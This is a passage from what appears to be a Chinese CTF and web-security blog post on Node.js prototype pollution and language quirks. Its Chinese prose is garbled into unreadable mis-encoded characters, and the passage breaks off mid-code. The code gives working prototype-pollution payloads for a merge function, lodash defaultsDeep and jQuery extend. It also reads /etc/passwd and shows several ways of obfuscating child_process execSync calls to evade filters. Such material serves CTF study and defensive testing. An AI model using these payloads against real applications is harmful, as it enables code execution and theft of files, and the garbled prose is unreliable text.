class="line"><span class="comment">// åŸå‹é“¾ï¼š</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾ï¼š</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾ï¼š</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure><p> å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span></span><br><span class="line"> foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">__proto__</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆå»ºç«‹ä¸€ä¸ªfooå¯¹è±¡ï¼Œæœ‰ä¸€ä¸ªbarå±æ€§ä¸º1. æ­¤æ—¶å®ƒçš„åŸå‹å¯¹è±¡ å¹¶æ²¡æœ‰ï¼Œåé¢é€šè¿‡<code>foo.__proto__</code>æŒ‡å‘äº†å®ƒçš„åŸå‹å¯¹è±¡ï¼Œä¹Ÿå°±ç­‰ä»·äºæ˜¯ <code>foo.prototype</code>ï¼Œå³objectã€‚ç»™ object åŸå‹å¯¹è±¡å¢åŠ äº†barå±æ€§ï¼Œå€¼ä¸ºäºŒ ã€‚ ç°åœ¨ object æœ‰äº†(ä¸€ä¸ªbar=2çš„prototypeåŸå‹å¯¹è±¡)ã€‚</li></ul><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_01.png" alt=""></p><ul><li><p>åé¢æˆ‘ä»¬å†æ¬¡ let zoo = {} ï¼Œzooå¯¹è±¡æ˜¯ç©ºçš„</p></li><li><p>ä½†æ˜¯åœ¨æˆ‘ä»¬è¾“å‡ºzoo.barçš„æ—¶å€™ï¼Œnode.jsçš„å¼•æ“å°±å¼€å§‹åœ¨zooä¸­æŸ¥æ‰¾ï¼Œå‘ç°æ²¡æœ‰ï¼Œå»zoo.protoä¸­æŸ¥æ‰¾ï¼Œå³åœ¨Objectä¸­æŸ¥æ‰¾ï¼Œè€Œæˆ‘ä»¬çš„<code>foo.prototype.bar = 2</code>ï¼Œå°±æ˜¯ç»™Objectæ·»åŠ äº†ä¸€ä¸ªbarå±æ€§ï¼Œè€Œè¿™ä¸ªå±æ€§åˆ™è¢«zooç»§æ‰¿ã€‚</p></li></ul><p>è¿™ç§ä¿®æ”¹äº†ä¸€ä¸ªæŸä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œæ§åˆ¶åˆ«çš„å¯¹è±¡çš„æ“ä½œï¼Œå°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p><h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»</p><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>(jsonæ ¼å¼æ‰å¯ä»¥è¢«å½“æˆkey)ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">// 1 2</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><h2 id="ejsæ±¡æŸ“"><a href="#ejsæ±¡æŸ“" class="headerlink" title="ejsæ±¡æŸ“"></a>ejsæ±¡æŸ“</h2><p>å‚è€ƒï¼š<a href="https://evi0s.com/2019/08/30/expresslodashejs-ä»åŸå‹é“¾æ±¡æŸ“åˆ°rce/">Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE - evi0sâ€™ Blog</a></p><h2 id="lodashæ±¡æŸ“"><a href="#lodashæ±¡æŸ“" class="headerlink" title="lodashæ±¡æŸ“"></a>lodashæ±¡æŸ“</h2><p><code>lodash.defaultsDeep(obj,JSON.parse(objstr));</code></p><p>åªéœ€è¦æœ‰<code>objstr</code>ä¸º</p><p><code>&#123;&quot;content&quot;:&#123;&quot;prototype&quot;:&#123;&quot;constructor&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;&#125;&#125;</code></p><p>åœ¨åˆå¹¶æ—¶ä¾¿ä¼šåœ¨Objectä¸Šé™„åŠ a=bè¿™æ ·ä¸€ä¸ªå±æ€§</p><p>lodash æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„JavaScriptå·¥å…·åº“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">check</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„jsè¯­å¥ï¼Œå°±å¯ä»¥æ£€æŸ¥è¿™ä¸ªç‰ˆæœ¬çš„lodashæ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚</p><p>å…¶ä¸­æ¼æ´å…³é”®è§¦å‘ç‚¹åœ¨<strong>defaultsDeepå‡½æ•°</strong>ï¼Œå®ƒå°†<code>(&#123;&#125;, JSON.parse(payload))</code>mergeæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚ä½¿ç”¨JSON.parseå°±æ˜¯ä¿è¯åˆå¹¶æ—¶èƒ½ä»¥å­—å…¸è§£æï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²</p><h2 id="JQueryæ±¡æŸ“"><a href="#JQueryæ±¡æŸ“" class="headerlink" title="JQueryæ±¡æŸ“"></a>JQueryæ±¡æŸ“</h2><p>JQuery æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„Jså‰ç«¯å·¥å…·åº“ï¼Œè€Œå®ƒä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_02.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°</p><p><code>$.extend(true,&#123;&#125;,JSON.parse(&#39;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#39;))</code></p><p>Jqueryå¯ä»¥ç”¨$.extendå°†ä¸¤ä¸ªå­—å…¸mergeï¼Œè€Œè¿™ä¹Ÿå› æ­¤æ±¡æŸ“äº†åŸå‹é“¾ã€‚</p><h1 id="Nodejsè¯­è¨€ç‰¹æ€§"><a href="#Nodejsè¯­è¨€ç‰¹æ€§" class="headerlink" title="Nodejsè¯­è¨€ç‰¹æ€§"></a>Nodejsè¯­è¨€ç‰¹æ€§</h1><h2 id="jså¤§å°å†™ç‰¹æ€§"><a href="#jså¤§å°å†™ç‰¹æ€§" class="headerlink" title="jså¤§å°å†™ç‰¹æ€§"></a>jså¤§å°å†™ç‰¹æ€§</h2><p>å¯¹äº<code>toUpperCase()</code>å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦<span class="string">&quot;Ä±&quot;</span>ã€<span class="string">&quot;Å¿&quot;</span> ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º <span class="string">&quot;I&quot;</span>ã€<span class="string">&quot;S&quot;</span></span><br></pre></td></tr></table></figure><p>å¯¹äº<code>toLowerCase</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦<span class="string">&quot;â„ª&quot;</span>ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º<span class="string">&quot;k&quot;</span>(è¿™ä¸ªâ„ªä¸æ˜¯K)</span><br></pre></td></tr></table></figure><p>è¯¦æƒ…ï¼š<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><ul><li>æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ</li><li>å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ</li><li>éæ•°å­—å‹å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œä»»ä½•æ¯”è¾ƒç»“æœéƒ½æ˜¯<code>false</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><ul><li>ç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalse</li><li>æ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨ä¸Šé¢çš„æ¯”è¾ƒæ–¹æ³•</li><li>æ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸²</li><li>æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]&gt;[]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>]&gt;[<span class="number">5</span>]); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>);  <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&quot;10&quot;</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>ä¸€äº›ç‰¹æ®Šçš„ç›¸ç­‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>) <span class="comment">// è¾“å‡ºï¼štrue </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>) <span class="comment">// è¾“å‡ºï¼šfalse </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>)  <span class="comment">// è¾“å‡ºï¼šfalse </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>)  <span class="comment">// è¾“å‡ºï¼šfalse</span></span><br></pre></td></tr></table></figure><p>å˜é‡æ‹¼æ¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6s</span></span><br></pre></td></tr></table></figure><h3 id="MD5ç»•è¿‡"><a href="#MD5ç»•è¿‡" class="headerlink" title="MD5ç»•è¿‡"></a>MD5ç»•è¿‡</h3><ul><li><p>è·Ÿphpå¾ˆåƒçš„æ•°ç»„ç»•è¿‡</p></li><li><p>å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure></li><li><p>payloadï¼š<code>a[x]=1&amp;b[x]=2</code>ï¼Œæ•°ç»„ä¼šè¢«è§£ææˆ<code>[object Object]</code></p></li></ul><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ul><li>16è¿›åˆ¶ç¼–ç ï¼š<code>console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></li><li>unicodeç¼–ç ï¼š<code>console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></li><li>baseç¼–ç ï¼š<code>eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></li></ul><h1 id="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><ul><li><code>exec()</code>ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><code>eval()</code>ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&quot;document.cookie&quot;</span>)); <span class="comment">//æ‰§è¡Œdocument.cookie</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;document.cookie&quot;</span>); <span class="comment">//è¾“å‡ºdocument.cookie</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h2><p><strong>è¯»ï¼š</strong></p><ul><li><p><code>readFile()</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><ul><li><code>readFileSync()</code>ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å†™ï¼š</strong></p><ul><li><p><code>writeFileSync()</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>writeFile()</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFile</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><p><strong>åŸå‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å­—ç¬¦æ‹¼æ¥ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)<span class="comment">//(%2bå°±æ˜¯+çš„urlç¼–ç )</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;cat flag.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>ç¼–ç ç»•è¿‡ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYXQgZmxhZy50eHQnKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p><strong>æ¨¡æ¿æ‹¼æ¥ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>ï¼‰</span><br></pre></td></tr></table></figure><p><strong>å…¶ä»–å‡½æ•°ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span 